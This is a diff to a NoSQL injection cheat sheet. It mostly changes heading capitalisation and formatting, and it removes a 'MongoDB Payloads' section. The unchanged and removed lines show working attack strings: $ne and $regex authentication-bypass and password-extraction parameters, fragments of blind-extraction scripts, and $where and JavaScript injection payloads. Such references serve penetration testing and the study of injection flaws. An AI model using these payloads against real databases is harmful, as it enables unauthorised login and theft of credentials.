@@ -8,13 +8,12 @@
 * [Tools](#tools)
 * [Methodology](#methodology)
     * [Authentication Bypass](#authentication-bypass)
-    * [Extract length information](#extract-length-information)
-    * [Extract data information](#extract-data-information)
+    * [Extract Length Information](#extract-length-information)
+    * [Extract Data Information](#extract-data-information)
 * [Blind NoSQL](#blind-nosql)
-    * [POST with JSON body](#post-with-json-body)
-    * [POST with urlencoded body](#post-with-urlencoded-body)
+    * [POST with JSON Body](#post-with-json-body)
+    * [POST with urlencoded Body](#post-with-urlencoded-body)
     * [GET](#get)
-* [MongoDB Payloads](#mongodb-payloads)
 * [Labs](#references)
 * [References](#references)
 
@@ -30,7 +29,7 @@
 
 ### Authentication Bypass
 
-Basic authentication bypass using not equal ($ne) or greater ($gt)
+Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
 
 * in HTTP data
   ```ps1
@@ -49,14 +48,16 @@ Basic authentication bypass using not equal ($ne) or greater ($gt)
   ```
 
 
-### Extract length information
+### Extract Length Information
+
+Inject a payload using the $regex operator. The injection will work when the length is correct.
 
 ```ps1
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-### Extract data information
+### Extract Data Information
 
 Extract data with "`$regex`" query operator.
 
@@ -86,7 +87,7 @@ Extract data with "`$in`" query operator.
 
 ## Blind NoSQL
 
-### POST with JSON body
+### POST with JSON Body
 
 Python script:
 
@@ -112,7 +113,7 @@ while True:
                 password += c
 ```
 
-### POST with urlencoded body
+### POST with urlencoded Body
 
 Python script:
 
@@ -140,7 +141,7 @@ while True:
 
 ### GET
 
-python script:
+Python script:
 
 ```python
 import requests
@@ -188,32 +189,6 @@ while true
     end
   end
 end
-```
-
-
-## MongoDB Payloads
-
-```bash
-true, $where: '1 == 1'
-, $where: '1 == 1'
-$where: '1 == 1'
-', $where: '1 == 1'
-1, $where: '1 == 1'
-{ $ne: 1 }
-', $or: [ {}, { 'a':'a
-' } ], $comment:'successful MongoDB injection'
-db.injection.insert({success:1});
-db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
-|| 1==1
-' && this.password.match(/.*/)//+%00
-' && this.passwordzz.match(/.*/)//+%00
-'%20%26%26%20this.password.match(/.*/)//+%00
-'%20%26%26%20this.passwordzz.match(/.*/)//+%00
-{$gt: ''}
-[$ne]=1
-';return 'a'=='a' && ''=='
-";return(true);var xyz='a
-0;return true
 ```
 
 
